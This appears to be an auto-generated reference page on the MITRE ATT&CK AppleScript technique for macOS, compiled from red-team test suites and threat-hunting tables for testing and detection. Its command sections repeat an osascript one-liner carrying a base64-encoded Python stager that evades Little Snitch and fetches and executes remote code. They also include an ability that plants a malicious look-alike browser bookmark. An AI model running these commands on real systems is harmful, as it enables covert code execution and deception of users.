
# AppleScript

## Description

### MITRE Description

> macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the <code>osalang</code> program.
AppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. 

Adversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python  (Citation: Macro Malware Targets Macs). Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e "script here"</code>.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['macOS']
* Remote: True
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1155

## Potential Commands

```
osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK'));\\\\\\\" | python &\\\"\"

{'darwin': {'sh': {'command': 'osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n', 'payloads': ['bookmark.scpt']}}}
osascript do shell script echo \"import 
osascript -e 'tell app "System Preferences" to activate'
python/persistence/osx/mail
python/persistence/osx/mail
```

## Commands Dataset

```
[{'command': 'osascript -e \\"do shell script \\\\\\"echo '
             '\\\\\\\\\\\\\\"import '
             'sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode(\'aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK\'));\\\\\\\\\\\\\\" '
             '| python &\\\\\\"\\"\n',
  'name': None,
  'source': 'atomics/T1155/T1155.yaml'},
 {'command': {'darwin': {'sh': {'command': 'osascript bookmark.scpt '
                                           '#{host.chrome.bookmark_title[filters(max=1)]} '
                                           '#{server.malicious.url[filters(max=1)]}\n',
                                'payloads': ['bookmark.scpt']}}},
  'name': 'Add a malicous bookmark which looks like a current one',
  'source': 'data/abilities/execution/de52784d-4de6-4d4e-b79e-e7b68fe037fb.yml'},
 {'command': 'osascript do shell script echo \\"import ',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'osascript -e \'tell app "System Preferences" to activate\'',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'python/persistence/osx/mail',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/persistence/osx/mail',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - AppleScript': {'atomic_tests': [{'auto_generated_guid': '3600d97d-81b9-4171-ab96-e4386506e2c2',
                                                           'description': 'Shell '
                                                                          'Script '
                                                                          'with '
                                                                          'AppleScript. '
                                                                          'The '
                                                                          'encoded '
                                                                          'python '
                                                                          'script '
                                                                          'will '
                                                                          'perform '
                                                                          'an '
                                                                          'HTTP '
                                                                          'GET '
                                                                          'request '
                                                                          'to '
                                                                          '127.0.0.1:80 '
                                                                          'with '
                                                                          'a '
                                                                          'session '
                                                                          'cookie '
                                                                          'of '
                                                                          '"t3VhVOs/DyCcDTFzIKanRxkvk3I=", '
                                                                          'unless '
                                                                          "'Little "
                                                                          "Snitch' "
                                                                          'is '
                                                                          'installed, '
                                                                          'in '
                                                                          'which '
                                                                          'case '
                                                                          'it '
                                                                          'will '
                                                                          'just '
                                                                          'exit. \n'
                                                                          'You '
                                                                          'can '
                                                                          'use '
                                                                          'netcat '
                                                                          'to '
                                                                          'listen '
                                                                          'for '
                                                                          'the '
                                                                          'connection '
                                                                          'and '
                                                                          'verify '
                                                                          'execution, '
                                                                          'e.g. '
                                                                          'use '
                                                                          '"nc '
                                                                          '-l '
                                                                          '80" '
                                                                          'in '
                                                                          'another '
                                                                          'terminal '
                                                                          'window '
                                                                          'before '
                                                                          'executing '
                                                                          'this '
                                                                          'test '
                                                                          'and '
                                                                          'watch '
                                                                          'for '
                                                                          'the '
                                                                          'request.\n'
                                                                          '\n'
                                                                          'Note: '
                                                                          'If '
                                                                          'you '
                                                                          'want '
                                                                          'to '
                                                                          'run '
                                                                          'this '
                                                                          'command '
                                                                          'manually '
                                                                          'on '
                                                                          'the '
                                                                          'command '
                                                                          'line '
                                                                          'use '
                                                                          "'sh "
                                                                          '-c '
                                                                          '"<command>"\'\n'
                                                                          'Reference: '
                                                                          'https://github.com/EmpireProject/Empire\n',
                                                           'executor': {'command': 'osascript '
                                                                                   '-e '
                                                                                   '\\"do '
                                                                                   'shell '
                                                                                   'script '
                                                                                   '\\\\\\"echo '
                                                                                   '\\\\\\\\\\\\\\"import '
                                                                                   'sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode(\'aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK\'));\\\\\\\\\\\\\\" '
                                                                                   '| '
                                                                                   'python '
                                                                                   '&\\\\\\"\\"\n',
                                                                        'name': 'sh'},
                                                           'name': 'AppleScript',
                                                           'supported_platforms': ['macos']}],
                                         'attack_technique': 'T1155',
                                         'display_name': 'AppleScript'}},
 {'Mitre Stockpile - Add a malicous bookmark which looks like a current one': {'description': 'Add '
                                                                                              'a '
                                                                                              'malicous '
                                                                                              'bookmark '
                                                                                              'which '
                                                                                              'looks '
                                                                                              'like '
                                                                                              'a '
                                                                                              'current '
                                                                                              'one',
                                                                               'id': 'de52784d-4de6-4d4e-b79e-e7b68fe037fb',
                                                                               'name': 'Add '
                                                                                       'bookmark',
                                                                               'platforms': {'darwin': {'sh': {'command': 'osascript '
                                                                                                                          'bookmark.scpt '
                                                                                                                          '#{host.chrome.bookmark_title[filters(max=1)]} '
                                                                                                                          '#{server.malicious.url[filters(max=1)]}\n',
                                                                                                               'payloads': ['bookmark.scpt']}}},
                                                                               'tactic': 'execution',
                                                                               'technique': {'attack_id': 'T1155',
                                                                                             'name': 'AppleScript'}}},
 {'Threat Hunting Tables': {'chain_id': '100198',
                            'commandline_string': 'do shell script echo '
                                                  '\\"import ',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'high',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1155',
                            'mitre_caption': 'applescript',
                            'os': 'mac',
                            'parent_process': 'osascript',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100199',
                            'commandline_string': '-e \'tell app "System '
                                                  'Preferences" to activate\'',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'high',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1155',
                            'mitre_caption': 'applescript',
                            'os': 'mac',
                            'parent_process': 'osascript',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1155',
                                            'ATT&CK Technique #2': 'T1108',
                                            'Concatenate for Python Dictionary': '"python/persistence/osx/mail":  '
                                                                                 '["T1155","T1108"],',
                                            'Empire Module': 'python/persistence/osx/mail',
                                            'Technique': 'AppleScript'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)

* [Lateral Movement](../tactics/Lateral-Movement.md)
    

# Mitigations

None

# Actors

None
